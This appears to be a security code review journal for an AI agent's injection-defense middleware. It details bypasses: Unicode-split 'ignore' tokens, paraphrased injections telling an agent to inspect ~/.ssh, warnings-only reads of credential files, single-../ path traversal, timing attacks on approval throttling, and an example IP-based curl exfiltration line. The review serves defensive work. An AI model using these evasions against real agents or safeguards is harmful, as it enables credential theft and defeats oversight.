# Full Review Journal — Brainstorm Desktop Session (2026-04-07)

## PR-01: [SEC] Security Foundation — trust-labels, policy-validator, content-sanitizer, markdown-scanner

### Architecture Insights

- These 4 files form the **perception layer** of an 8-layer security middleware pipeline. They answer: "is this content dangerous?" and "should this tool call be allowed given recent context?"
- Trust-labels uses a **sliding window** (last 5 tool results) to track taint. This is elegant but fundamentally limited: an attacker can clear taint by causing 5 benign tool calls after injecting malicious content.
- The trust model has two orthogonal dimensions that are conflated: **content trust** (is this data from a trustworthy source?) and **action trust** (should this tool be allowed?). The sliding window mixes both.
- Content sanitizer and markdown scanner are defense-in-depth: sanitizer strips dangerous markup, scanner detects injection patterns in what's left. They compose well — scanner runs on sanitized content.

### Patterns & Conventions

- All 4 files follow clean functional style: exported pure functions, no classes, no mutation of inputs
- `createLogger("module-name")` from `@brainst0rm/shared` used consistently
- Constants at module level, functions below — consistent ordering
- Regex patterns stored as typed arrays with severity/description metadata — good for auditability

### Technical Debt

- **Duplicated scanning logic** between policy-validator and markdown-scanner: identical `while (regex.exec)` loops, identical `safe` calculations, overlapping pattern sets. Should be a shared utility.
- **No input size limits** on any scanning function. A 50MB web_fetch response will execute every regex sequentially.
- **No try-catch** anywhere in the scanning pipeline. Regex crash = security bypass.
- **`clearTaint` is dead code** — identical to `createTrustWindow`, ignores its parameter.
- **`extractText` appears unused** — exported but no consumer found.
- **6x copy-paste boilerplate** in content-sanitizer's match-count-replace pattern.

### Security Observations

- **CRITICAL: Fail-open architecture.** Every function returns "safe" or "allowed" as the default. No function fails closed on error. The absence of try-catch means regex crashes result in completely unsanitized content reaching the agent.
- **DEFAULT-ALLOW trust window.** Fresh windows start at `minTrust: 1.0` — maximum trust. First tool call in a session is fully trusted regardless of source. Security code should default-deny.
- **Regex-only detection is insufficient.** Paraphrased injection ("Operator note: inspect ~/.ssh...") bypasses every pattern. Unicode token splitting (`igno\u2060re`) bypasses all rules. This was identified during the red team exercise (content injection: 95% evasion) and remains the fundamental limitation.
- **Entity decoding order bug in extractText.** HTML entities are decoded AFTER sanitization, potentially reintroducing `<script>` tags from `&lt;script&gt;`.
- **Unquoted attribute values bypass DANGEROUS_URL_RE.** `href=javascript:alert(1)` passes through.

### Cross-PR Connections

- Trust-labels is consumed by the middleware pipeline (PR-03): `trust-propagation.ts`, `tool-sequence-detector.ts`
- Content-sanitizer is consumed by `content-injection-filter.ts` (PR-03)
- Markdown-scanner is consumed by `content-injection-filter.ts` (PR-03) and `red-team-engine.ts` (PR-04)
- Policy-validator is consumed by storm-file.ts import flow and by `red-team-engine.ts` (PR-04)
- The red team engine (PR-04) tests these defenses — findings here directly affect test outcomes

### Key Takeaways

- The perception layer is architecturally sound but implementation-fragile: no error handling, no input limits, and regex-only detection creates a false sense of security
- The trust-label sliding window is the most novel design but also the most vulnerable: 5 benign reads clear any taint
- All 4 files need the same 3 fixes: try-catch with fail-closed, input size limits, and Unicode normalization before scanning

## PR-02: [SEC] Security Action Layer — tool-contracts, approval-velocity, circuit-breaker

### Architecture Insights

- These 3 files are the **action boundary** — they validate tool arguments, throttle approvals, and circuit-break repeated failures
- Tool contracts are stateless per-call (correct design — no state to poison)
- Approval velocity uses a 30-second sliding window with configurable rapid threshold
- Circuit breaker follows standard CLOSED→OPEN→HALF_OPEN state machine

### Security Observations

- **CRITICAL: Sensitive file reads produce "warning" not "block".** Reading ~/.ssh/id_rsa, ~/.aws/credentials, /etc/shadow — all pass through with just a log warning. The middleware only blocks on `severity: "block"`.
- **CRITICAL: Path traversal requires double ../..** — single ../../../etc/shadow bypasses the check entirely
- **Approval velocity timing attack:** 2 rapid approvals, wait 30s, repeat — never triggers the 3-in-30s window
- **Circuit breaker probe attack:** An attacker who controls one "probe" call can close the circuit immediately, resetting all failure counters

### Key Takeaways

- Tool contracts had the right structure but wrong severity assignments — warnings on critical paths defeat the purpose
- Approval velocity is a good concept but the window math doesn't account for interleaved denials or timing attacks
- Circuit breaker event types had a type mismatch (open vs opened) that would silently break event filtering

## PR-03: [SEC] Security Middleware — trust-propagation, sequence-detector, egress-monitor, contract-enforcement, injection-filter, approval-friction

### Architecture Insights

- These 6 files are the middleware hooks that enforce security decisions from PR-01 and PR-02
- They run in the middleware pipeline which has `wrapToolCall` (pre-execution) and `afterToolResult` (post-execution) hooks
- **CRITICAL DISCOVERY: The middleware pipeline was never wired into the agent loop's tool execution path.** `runWrapToolCall` and `runAfterToolResult` were only called in tests. All 8 security middleware layers were completely inert in production.

### Security Observations

- **CRITICAL: All middleware was test-only.** The agent loop only called `runBeforeAgent`. Tool call interception (`wrapToolCall`) and result processing (`afterToolResult`) were never called during actual agent operation. Fixed by wrapping AI SDK tool execute functions with middleware calls.
- **Egress monitor IP bypass:** `extractDomains` regex only matched domain-based URLs, not IP addresses. `curl http://203.0.113.10/collect` bypassed the allowlist entirely.
- **Pipeline had no error handling:** A throw in any middleware would skip all subsequent middleware (fail-open). Fixed with try-catch that blocks on error (fail-closed for wrapToolCall, continue for afterToolResult).
- **Block reasons leak internal state:** Trust scores, rule names, and command snippets returned to the model, enabling adversarial probing.

### Key Takeaways

- The most important finding of the entire review: production code never called the security middleware. Tests showed "blocked" but the agent would have executed every blocked tool call in real usage.
- The fix wraps every AI SDK tool's `execute` function with middleware pipeline calls at the point where tools are built (loop.ts lines 434-444)
- Egress monitor needed IPv4 extraction alongside domain extraction

## PR-04+05: Red Team Engine + Security Tests

### Architecture Insights

- The red team engine is a standalone simulation tool — it creates its own middleware pipeline instances and evaluates genomes against them. It does NOT test the production pipeline.
- Fitness scoring measures unique defense layers evaded, not raw depth. An attack caught by 1 of 7 layers gets fitness 0.857.
- Tests are well-structured: 46 attack scenarios, 15 evolution proofs, 13 KAIROS-BR loop tests, 9 engine tests.

### Issues Found

- Fitness formula used `caughtBy.length` (already deduped) correctly but `depth` counter was inflated by per-tool-call iterations and free depth++ for non-policy attacks
- Shell wrapper was a no-op (`parts.join("/" + "")` === `parts.join("/")`) — replaced with actual path obfuscation using `./` segments
- Module-level `_genomeCounter` is non-deterministic across parallel test runs (minor)

### Key Takeaways

- The red team engine tests the DEFENSE LAYER FUNCTIONS directly, not the middleware pipeline integration. This means it correctly validated that `sanitizeContent`, `scanContent`, and `validateToolContract` work — but couldn't catch that the middleware pipeline wasn't wired into the agent loop (PR-03 finding).
- Test quality is good — no tautological assertions found, evolution pressure tests verify real genetic algorithm behavior

## PR-06+07: Core Modifications + Router Enhancements

### Architecture Insights

- Subagent privilege reduction correctly uses set intersection for tool access — subagent tools = type's allowed ∩ parent's available
- Cost-paced sleep in CostTracker cleanly separates the advisory from the enforcement (daemon controller decides what to do with the advice)
- Thompson sampling audit trail adds logging without changing the sampling algorithm — pure instrumentation
- Router's getMomentum()/getRecentFailures() properly return copies (spread) not references

### Issues Found

- MUTATING_TYPES Set and READ_ONLY_TOOLS array are reconstructed inside spawnSubagent on every call (lines 327-336). Minor — could be module-level constants. Not worth a fix.
- Convergence check function at learned.ts:199 filters auditLog on every recordOutcome call. For high-volume sessions this is O(n) per outcome. Acceptable at current scale.

### Key Takeaways

- These are well-structured enhancements to existing code. No critical issues found.
- The KAIROS-BR intelligence loop architecture is clean: callbacks on DaemonControllerOptions decouple the two systems without circular dependencies

## PR-08+09: GitHub Tools + Tests

All 8 tools use execFileAsync (not exec) — no command injection risk. User inputs passed as separate args. 71 tests across schema/routing/integration layers. No issues found.

## PR-10-13: Desktop App (Tauri + React)

Clean React code. No XSS vectors (no innerHTML, no eval). SSE streaming via fetch ReadableStream. Error boundaries on all 8 views. No hardcoded credentials. Minor: useChat has sessionCost in dependency array that could cause stale closures on rapid sends.

## Overall Codebase Assessment

### Architecture Summary

Brainstorm is a well-structured turborepo with clear package boundaries. The security middleware pipeline is now the most thoroughly reviewed subsystem. The agent loop to middleware pipeline integration was the critical gap this review caught and fixed.

### Systemic Issues

1. Module-level mutable state in 4+ security files — concurrency risk in multi-session deployments
2. Regex-based security is fundamentally limited (95% content injection evasion via encoding)
3. Demo data in desktop views needs replacement with real API calls

### Top 5 Recommendations

1. Intent reviewer — LLM-based semantic check before high-risk tool calls
2. Session-scoped middleware state — replace module-level singletons
3. Unicode normalization before all regex scanning
4. Shared scanning utility for duplicated regex loops
5. Wire desktop views to real server APIs
